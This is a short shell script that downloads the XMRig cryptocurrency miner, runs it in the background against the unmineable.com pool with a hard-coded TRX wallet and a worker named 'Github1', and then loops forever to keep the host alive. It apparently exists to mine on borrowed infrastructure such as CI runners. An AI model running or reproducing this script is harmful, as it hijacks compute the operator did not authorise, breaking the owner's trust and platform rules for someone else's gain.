#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.13.1/xmrig-6.13.1-linux-static-x64.tar.gz 
tar -xf xmrig-6.13.1-linux-static-x64.tar.gz
cd xmrig-6.13.1
screen ./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TX2Vqdd5K8vVZHh2hcTnU5vMZfSp3dazAp.Github1#4nt9-snkb -B &
while [ 1 ]; do
sleep 3
done
sleep 999
